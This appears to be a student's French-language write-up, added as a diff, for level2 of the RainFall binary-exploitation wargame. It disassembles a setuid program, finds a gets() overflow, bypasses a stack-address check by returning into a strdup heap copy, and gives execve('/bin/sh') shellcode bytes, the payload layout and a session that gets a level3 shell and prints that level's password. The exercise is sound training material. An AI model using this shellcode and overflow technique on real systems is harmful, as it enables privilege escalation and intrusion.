@@ -1,0 +1,107 @@
+-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*
+
+level2@RainFall:~$ ./level2 
+asdsad
+asdsad
+
+Recup un input puis l'affiche
+
+0804853f <main>:
+ 804853f:       55                      push   %ebp
+ 8048540:       89 e5                   mov    %esp,%ebp
+ 8048542:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048545:       e8 8a ff ff ff          call   80484d4 <p>
+
+080484d4 <p>:
+ 80484d4:       55                      push   %ebp
+ 80484d5:       89 e5                   mov    %esp,%ebp
+ 80484d7:       83 ec 68                sub    $0x68,%esp			-> StackFrame de 104
+ 80484da:       a1 60 98 04 08          mov    0x8049860,%eax
+ 80484df:       89 04 24                mov    %eax,(%esp)
+ 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>	-> Garanti le prompt meme en cas de crash => inutile
+ 80484e7:       8d 45 b4                lea    -0x4c(%ebp),%eax		-> 0x4c => 76 taille du buffer | 28 bytes de vars locales -> inutile
+ 80484ea:       89 04 24                mov    %eax,(%esp)			-> eax est donné en arg, le buffer de 76 est utilisé par gets
+ 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>	-> overflow possible
+ 80484f2:       8b 45 04                mov    0x4(%ebp),%eax		-> eip(ebp + 4) save dans eax
+ 80484f5:       89 45 f4                mov    %eax,-0xc(%ebp)		-> eip est save a la pos ebp - 12 => dans le buffer 80 - 12 => 68 
+ 80484f8:       8b 45 f4                mov    -0xc(%ebp),%eax		-> valeur de buf[68] save dans eax
+ 80484fb:       25 00 00 00 b0          and    $0xb0000000,%eax		-> Compare si la valeur recup est égale -> $ valeur constante
+ 8048500:       3d 00 00 00 b0          cmp    $0xb0000000,%eax		-> Compare si la valeur recup est égale
+ 8048505:       75 20                   jne    8048527 <p+0x53>		-> Suite vers puts
+ 8048507:       b8 20 86 04 08          mov    $0x8048620,%eax
+ 804850c:       8b 55 f4                mov    -0xc(%ebp),%edx
+ 804850f:       89 54 24 04             mov    %edx,0x4(%esp)
+ 8048513:       89 04 24                mov    %eax,(%esp)
+ 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>	-> Affiche quelque chose
+ 804851b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+ 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>	
+ 8048527:       8d 45 b4                lea    -0x4c(%ebp),%eax		-> save dans eax l'addr du buffer
+ 804852a:       89 04 24                mov    %eax,(%esp)			-> écrit au sommet de la pile eax => buffer
+ 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>	-> La fonction prend le sommet de la pile en arg
+ 8048532:       8d 45 b4                lea    -0x4c(%ebp),%eax		-> save dans eax l'addr du buffer
+ 8048535:       89 04 24                mov    %eax,(%esp)			-> écrit au sommet de la pile eax => buffer
+ 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>	-> La fonction prend le sommet de la pile en arg
+ 804853d:       c9                      leave  
+ 804853e:       c3                      ret   
+
+
+
+Ici la problématique est que fflush empêche l'analyse des registres au moment du crash de gets
+
+Il semblerait qu'il faille injecter la valeur 0xb0000000 à la position 12 de la stackframe
+Cela doit correspondre à une var qui est ensuite checké binairement et via un compare
+
+Objectif:
+1- Provoquer un overflow sur gets => 76 + 4(ebp) => 80 + eip
+2- Injecter un shellcode dans le payload
+
+80 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
+															   |XXXX|
+Le check sert enfaite de garde fou anti overflow: le printf fonctionne a cause de l'overflow
+En gros il recup la valeur de eip pour la mettre dans la var puis save dans mon buffer
+Enfin il compare, s'il ne passe pas il printf qui affiche mon buffer d'où le fait que je vois les BBBB
+
+=> !!! Il ne faut pas overflow gets !!!
+
+=> $0xb0000000 => Masque de plage mémoire
+1011 0000 0000 0000 0000 0000 0000 0000 => Stack
+
+0x080484fb <+39>:    and    $0xb0000000,%eax -> and vérif que les 4 bits fort => 1011 puis save le retour dans eax
+0x08048500 <+44>:    cmp    $0xb0000000,%eax -> compare le ret du and avec $0xb0000000
+
+Puisque seul le poid fort est testé, la plage va de 0xb0000000 à 0xbfffffff
+Il faut une addr en dehors de cette plage
+l'addr dans eip ne doit impérativement PAS commencé par -> 0xb
+
+call   80483e0 <strdup@plt>	-> la mémoire n'est pas free
+l'addr de la heap ne fait pas partie du mask
+
+Objectif:
+1- Déterminer où se trouve la heap -> break sur strdup et vérif l'addr du retour
+2- Provoquer un overflow sur gets => 76 + 4(ebp) => 80 + eip avec l'addr buf heap
+
+=> eax 0x804a008 -> return de strdup donc addr du nouveau buf alloué sur la heap
+
+1000 0000 0100 1010 1001 1100 0000 => Bit forts diff
+
+l'addr reste fixe entre plusieurs execs 
+
+little endian -> 0x804a008 => \x08\xA0\x04\x08
+
+payload = NOP Sled + ShellCode + padding + ret addr(eip)
+			20     + 80 - len(shellcode) + \x08\xA0\x04\x08
+
+execve("/bin/sh") 21/23 bytes :
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+
+level2@RainFall:~$ cat /tmp/sad - | ./level2 
+��������������������1�Ph//shh/bin��PS�ᙰ
+                                       ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
